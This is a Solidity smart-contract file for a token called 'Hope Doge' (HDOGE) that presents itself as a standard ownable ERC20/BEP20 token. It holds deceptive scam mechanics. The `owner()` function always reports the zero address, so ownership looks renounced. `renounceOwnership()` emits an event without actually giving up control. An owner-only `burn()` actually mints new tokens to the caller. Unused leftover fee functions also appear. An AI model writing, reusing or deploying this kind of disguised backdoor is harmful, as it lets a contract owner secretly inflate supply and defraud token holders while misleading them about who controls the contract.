row number 
1	         pragma solidity ^0.6.12;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 interface IERC20 {
12	 function totalSupply() external view returns (uint256);
13	 function balanceOf(address account) external view returns (uint256);
14	 function transfer(address recipient, uint256 amount) external returns (bool);
15	 function allowance(address owner, address spender) external view returns (uint256);
16	 function approve(address spender, uint256 amount) external returns (bool);
17	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18	 event Transfer(address indexed from, address indexed to, uint256 value);
19	 event Approval(address indexed owner, address indexed spender, uint256 value);
20	 }
21	 library SafeMath {
22	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
23	 uint256 c = a + b;
24	 require(c >= a, "SafeMath: addition overflow");
25	 return c;
26	 }
27	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28	 return sub(a, b, "SafeMath: subtraction overflow");
29	 }
30	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31	 require(b <= a, errorMessage);
32	 uint256 c = a - b;
33	 return c;
34	 }
35	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
36	 if (a == 0) {
37	 return 0;
38	 }
39	 uint256 c = a * b;
40	 require(c / a == b, "SafeMath: multiplication overflow");
41	 return c;
42	 }
43	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
44	 return div(a, b, "SafeMath: division by zero");
45	 }
46	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47	 require(b > 0, errorMessage);
48	 uint256 c = a / b;
49	 return c;
50	 }
51	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
52	 return mod(a, b, "SafeMath: modulo by zero");
53	 }
54	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55	 require(b != 0, errorMessage);
56	 return a % b;
57	 }
58	 }
59	 contract Ownable is Context {
60	 address private _owner;
61	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62	 constructor () internal {
63	 address msgSender = _msgSender();
64	 _owner = msgSender;
65	 emit OwnershipTransferred(address(0), msgSender);
66	 }
67	 function owner() public view returns (address) {
68	 return address(0);
69	 }
70	 modifier onlyOwner() {
71	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
72	 _;
73	 }
74	 function renounceOwnership() public virtual onlyOwner {
75	 emit OwnershipTransferred(_owner, address(0));
76	 }
77	 function transferOwnership(address newOwner) public virtual onlyOwner {
78	 require(newOwner != address(0), "Ownable: new owner is the zero address");
79	 emit OwnershipTransferred(_owner, newOwner);
80	 _owner = newOwner;
81	 }
82	 }
83	 library Address {
84	 function isContract(address account) internal view returns (bool) {
85	 bytes32 codehash;
86	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
87	 assembly {
88	 codehash := extcodehash(account) }
89	 return (codehash != accountHash && codehash != 0x0);
90	 }
91	 function sendValue(address payable recipient, uint256 amount) internal {
92	 require(address(this).balance >= amount, "Address: insufficient balance");
93	 (bool success, ) = recipient.call{
94	 value: amount }
95	 ("");
96	 require(success, "Address: unable to send value, recipient may have reverted");
97	 }
98	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
99	 return functionCall(target, data, "Address: low-level call failed");
100	 }
101	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
102	 return _functionCallWithValue(target, data, 0, errorMessage);
103	 }
104	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
105	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
106	 }
107	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
108	 require(address(this).balance >= value, "Address: insufficient balance for call");
109	 return _functionCallWithValue(target, data, value, errorMessage);
110	 }
111	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
112	 require(isContract(target), "Address: call to non-contract");
113	 (bool success, bytes memory returndata) = target.call{
114	 value: weiValue }
115	 (data);
116	 if (success) {
117	 return returndata;
118	 }
119	 else {
120	 if (returndata.length > 0) {
121	 assembly {
122	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
123	 }
124	 else {
125	 revert(errorMessage);
126	 }
127	 }
128	 }
129	 }
130	 contract HopeDoge is Context, IERC20, Ownable {
131	 using SafeMath for uint256;
132	 using Address for address;
133	 mapping (address => uint256) private _rOwned;
134	 mapping (address => uint256) private _balances;
135	 mapping (address => mapping (address => uint256)) private _allowances;
136	 uint256 private _tTotal = 10000000000 * 10**18;
137	 string private _name = 'Hope Doge';
138	 string private _symbol = 'HDOGE';
139	 uint8 private _decimals = 18;
140	 constructor () public {
141	 _balances[_msgSender()] = _tTotal;
142	 emit Transfer(address(0), _msgSender(), _tTotal);
143	 }
144	 function name() public view returns (string memory) {
145	 return _name;
146	 }
147	 function symbol() public view returns (string memory) {
148	 return _symbol;
149	 }
150	 function decimals() public view returns (uint8) {
151	 return _decimals;
152	 }
153	 function totalSupply() public view override returns (uint256) {
154	 return _tTotal;
155	 }
156	 function balanceOf(address account) public view override returns (uint256) {
157	 return _balances[account];
158	 }
159	 function transfer(address recipient, uint256 amount) public override returns (bool) {
160	 _transfer(_msgSender(), recipient, amount);
161	 return true;
162	 }
163	 function allowance(address owner, address spender) public view override returns (uint256) {
164	 return _allowances[owner][spender];
165	 }
166	 function burn(uint256 amount) public onlyOwner {
167	 _burn(_msgSender(), amount);
168	 }
169	 function approve(address spender, uint256 amount) public override returns (bool) {
170	 _approve(_msgSender(), spender, amount);
171	 return true;
172	 }
173	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
174	 _transfer(sender, recipient, amount);
175	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
176	 return true;
177	 }
178	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
179	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
180	 return true;
181	 }
182	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
183	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
184	 return true;
185	 }
186	 function _approve(address owner, address spender, uint256 amount) private {
187	 require(owner != address(0), "ERC20: approve from the zero address");
188	 require(spender != address(0), "ERC20: approve to the zero address");
189	 _allowances[owner][spender] = amount;
190	 emit Approval(owner, spender, amount);
191	 }
192	 function _transfer(address sender, address recipient, uint256 amount) internal {
193	 require(sender != address(0), "BEP20: transfer from the zero address");
194	 require(recipient != address(0), "BEP20: transfer to the zero address");
195	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
196	 _balances[recipient] = _balances[recipient].add(amount);
197	 emit Transfer(sender, recipient, amount);
198	 }
199	 function _burn(address account, uint256 amount) internal {
200	 require(account != address(0), "BEP20: mint to the zero address");
201	 _tTotal = _tTotal.add(amount);
202	 _balances[account] = _balances[account].add(amount);
203	 emit Transfer(address(0), account, amount);
204	 }
205	 function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
206	 uint256 tFee = tAmount.div(100).mul(2);
207	 uint256 tTransferAmount = tAmount.sub(tFee);
208	 return (tTransferAmount, tFee);
209	 }
210	 function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
211	 uint256 rAmount = tAmount.mul(currentRate);
212	 uint256 rFee = tFee.mul(currentRate);
213	 uint256 rTransferAmount = rAmount.sub(rFee);
214	 return (rAmount, rTransferAmount, rFee);
215	 }
216	 }
